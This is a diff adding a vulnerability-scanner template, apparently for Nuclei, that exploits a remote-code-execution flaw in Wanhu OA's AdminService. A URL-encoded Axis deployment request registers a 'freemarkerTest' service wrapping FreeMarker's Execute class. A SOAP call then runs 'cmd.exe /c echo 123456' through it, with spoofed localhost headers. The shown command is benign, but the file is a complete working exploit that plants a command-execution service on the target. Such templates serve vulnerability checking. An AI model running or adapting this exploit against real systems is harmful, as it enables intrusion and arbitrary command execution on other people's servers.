@@ -1,0 +1,57 @@
+id: Wanhu-AdminService-rce
+ 
+info:
+  name: 万户OA-AdminService-RCE
+  author: pitaya
+  severity: high
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  servicename: "{{to_lower(rand_base(20))}}"
+  randomstr: "{{to_lower(rand_base(20))}}"
+requests:
+  - raw:
+      - |
+        GET /defaultroot/services/AdminService;1.js?method=%21%2d%2d%3e%3c%64%65%70%6c%6f%79%6d%65%6e%74%20%78%6d%6c%6e%73%3d%22%68%74%74%70%3a%2f%2f%78%6d%6c%2e%61%70%61%63%68%65%2e%6f%72%67%2f%61%78%69%73%2f%77%73%64%64%2f%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%78%6d%6c%6e%73%3a%6a%61%76%61%3d%22%68%74%74%70%3a%2f%2f%78%6d%6c%2e%61%70%61%63%68%65%2e%6f%72%67%2f%61%78%69%73%2f%77%73%64%64%2f%70%72%6f%76%69%64%65%72%73%2f%6a%61%76%61%22%3e%0a%20%20%20%20%20%20%20%3c%73%65%72%76%69%63%65%20%6e%61%6d%65%3d%22%66%72%65%65%6d%61%72%6b%65%72%54%65%73%74%22%20%70%72%6f%76%69%64%65%72%3d%22%6a%61%76%61%3a%52%50%43%22%3e%0a%09%09%3c%70%61%72%61%6d%65%74%65%72%20%6e%61%6d%65%3d%22%63%6c%61%73%73%4e%61%6d%65%22%20%76%61%6c%75%65%3d%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%2f%3e%0a%09%09%3c%70%61%72%61%6d%65%74%65%72%20%6e%61%6d%65%3d%22%61%6c%6c%6f%77%65%64%4d%65%74%68%6f%64%73%22%20%76%61%6c%75%65%3d%22%2a%22%2f%3e%0a%20%20%20%20%20%20%20%3c%2f%73%65%72%76%69%63%65%3e%0a%20%20%20%20%3c%2f%64%65%70%6c%6f%79%6d%65%6e%74 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        Cache-Control: max-age=0
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+ 
+      - |
+        POST /defaultroot/services/freemarkerTest;1.js HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
+        Content-Length: 732
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,fil;q=0.6
+        Cache-Control: no-cache
+        Connection: close
+        Content-Type: text/xml;charset=UTF-8
+        Pragma: no-cache
+        SOAPAction: ""
+ 
+ 
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://utility.template.freemarker" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
+          <soapenv:Header/>
+          <soapenv:Body>
+              <util:exec soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+                <arguments>
+                    <string xsi:type="soapenc:string">cmd.exe /c echo 123456</string>
+                </arguments>
+              </util:exec>
+          </soapenv:Body>
+        </soapenv:Envelope>
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2==200 && contains(body_2,"123456")'
